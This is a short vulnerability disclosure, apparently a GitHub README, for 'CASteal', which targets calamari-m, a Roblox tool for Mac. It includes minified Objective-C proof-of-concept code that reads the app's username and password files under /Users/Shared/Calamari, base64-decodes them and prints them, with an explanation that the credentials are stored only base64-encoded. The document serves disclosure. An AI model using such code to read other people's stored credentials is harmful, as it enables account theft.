# CASteal A.K.A. Pulling a fast one on calamari-m
## CASteal is a proof of concept for a security vulnerability in all versions of calamari-m for roblox
```mm
#import <Foundation/Foundation.h>
int main() {
    printf("Heres ur calamari account\nUsername: %s\nPassword: %s\n",[[[NSString alloc] initWithData:[[NSData alloc] initWithBase64EncodedString:[NSString stringWithContentsOfFile:@"/Users/Shared/Calamari/GY" encoding:NSUTF8StringEncoding error:nil] options:0] encoding:NSUTF8StringEncoding] UTF8String],[[[NSString alloc] initWithData:[[NSData alloc] initWithBase64EncodedString:[NSString stringWithContentsOfFile:@"/Users/Shared/Calamari/NGV" encoding:NSUTF8StringEncoding error:nil] options:0] encoding:NSUTF8StringEncoding] UTF8String]);
}
```
a minified version of the proof of concept is shown above.
how this works:
Calamari (for mac) account cridentials are stored for reuse by the ui and dylib to autheticate your user.
their paths are /Users/Shared/Calamari/GY for username and /Users/Shared/Calamari/NGV for password.
however they are only stored in Base64 encoding meaning they can be easily decoded and sent anywhere by a proccess.
